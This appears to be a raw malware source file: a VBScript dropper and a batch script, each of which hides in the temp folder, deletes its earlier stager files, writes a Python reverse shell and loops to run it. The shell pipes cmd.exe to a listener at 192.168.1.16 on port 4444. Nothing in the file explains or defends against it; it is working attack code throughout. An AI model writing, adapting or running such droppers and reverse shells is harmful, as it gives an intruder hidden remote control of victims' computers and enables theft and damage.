Set objShell = CreateObject("WScript.Shell")
temp_dir = objShell.ExpandEnvironmentStrings("%temp%")
objShell.CurrentDirectory = Left(temp_dir, 2)
objShell.CurrentDirectory = temp_dir
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("pro1.bat")
objFile.WriteLine "@echo off"
objFile.WriteLine "del vb1.vbs"
objFile.WriteLine "del post.bat"
objFile.WriteLine ":loop"
objFile.WriteLine "set FILE=%temp%\sh1.py"
objFile.WriteLine "if not exist %FILE% ("
objFile.WriteLine "    ("
objFile.WriteLine "        echo import socket"
objFile.WriteLine "        echo import os"
objFile.WriteLine "        echo import threading"
objFile.WriteLine "        echo import subprocess as sp"
objFile.WriteLine "        echo import time"
objFile.WriteLine "        echo."
objFile.WriteLine "        echo def rev^(^)^:"
objFile.WriteLine "        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)"
objFile.WriteLine "        echo    s = socket.socket^(^)"
objFile.WriteLine "        echo."
objFile.WriteLine "        echo    try:"
objFile.WriteLine "        echo        s.connect^(^('192.168.1.16', 4444^)^)"
objFile.WriteLine "        echo    except ConnectionRefusedError as e:"
objFile.WriteLine "        echo        print^('refused ... Check if listener is running.'^)"
objFile.WriteLine "        echo        return"
objFile.WriteLine "        echo."
objFile.WriteLine "        echo    def s_o^(^)^:"
objFile.WriteLine "        echo        while True^:"
objFile.WriteLine "        echo            try^:"
objFile.WriteLine "        echo                output = os.read^(p.stdout.fileno^(^), 1024^)"
objFile.WriteLine "        echo                if not output^:"
objFile.WriteLine "        echo                    break"
objFile.WriteLine "        echo                s.sendall^(output^)"
objFile.WriteLine "        echo            except Exception as e^:"
objFile.WriteLine "        echo                print^('Error sending output:', e^)"
objFile.WriteLine "        echo                break"
objFile.WriteLine "        echo."
objFile.WriteLine "        echo    def r_i^(^)^:"
objFile.WriteLine "        echo        while True^:"
objFile.WriteLine "        echo            try^:"
objFile.WriteLine "        echo                data = s.recv^(1024^)"
objFile.WriteLine "        echo                if not data^:"
objFile.WriteLine "        echo                    break"
objFile.WriteLine "        echo                p.stdin.write^(data^)"
objFile.WriteLine "        echo                p.stdin.flush^(^)"
objFile.WriteLine "        echo            except Exception as e^:"
objFile.WriteLine "        echo                print^('Error receiving input:', e^)"
objFile.WriteLine "        echo                break"
objFile.WriteLine "        echo."
objFile.WriteLine "        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)"
objFile.WriteLine "        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)"
objFile.WriteLine "        echo    time.sleep^(40^)"
objFile.WriteLine "        echo."
objFile.WriteLine "        echo while True^:"
objFile.WriteLine "        echo    rev^(^)"
objFile.WriteLine "        echo    print^('Loading ...'^)"
objFile.WriteLine "    ) > %FILE%"
objFile.WriteLine ") else ("
objFile.WriteLine "   python %FILE%"
objFile.WriteLine "   timeout /t 80 >nul"
objFile.WriteLine ")"
objFile.WriteLine "goto loop" 
objFile.Close

objShell.Run "%temp%\pro1.bat", 0, False
------------------------------
@echo off
cd %temp%

@echo off
del vb1.bat
del %temp%\post.bat
:loop
set FILE=%temp%\sh.py
if not exist %FILE% (
    (
        echo import socket
        echo import os
        echo import threading
        echo import subprocess as sp
        echo import time
        echo.
        echo def rev^(^):
        echo    p = sp.Popen^(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT^)
        echo    s = socket.socket^(^)
        echo.
        echo    try^:
        echo        s.connect^(^('192.168.1.16', 4444^)^)
        echo    except ConnectionRefusedError as e^:
        echo        print^('refused ... Check if listener is running.'^)
        echo        return
        echo.
        echo    def s_o^(^):
        echo        while True^:
        echo            try^:
        echo                output = os.read^(p.stdout.fileno^(^), 1024^)
        echo                if not output^:
        echo                    break
        echo                s.sendall^(output^)
        echo            except Exception as e^:
        echo                print^("Error sending output:", e^)
        echo                break
        echo.
        echo    def r_i^(^):
        echo        while True^:
        echo            try^:
        echo                data = s.recv^(1024^)
        echo                if not data^:
        echo                    break
        echo                p.stdin.write^(data^)
        echo                p.stdin.flush^(^)
        echo            except Exception as e^:
        echo                print^("Error receiving input:", e^)
        echo                break
        echo.
        echo    threading.Thread^(target=s_o, daemon=True^).start^(^)
        echo    threading.Thread^(target=r_i, daemon=True^).start^(^)
        echo.
        echo    time.sleep^(30^)
        echo.
        echo while True^:
        echo    rev^(^)
        echo    print^("Loading ..."^)
    ) > %FILE%
) else (
   python3 %FILE%
   timeout /t 60 >nul
)
goto loop

powershell run pro1.bat
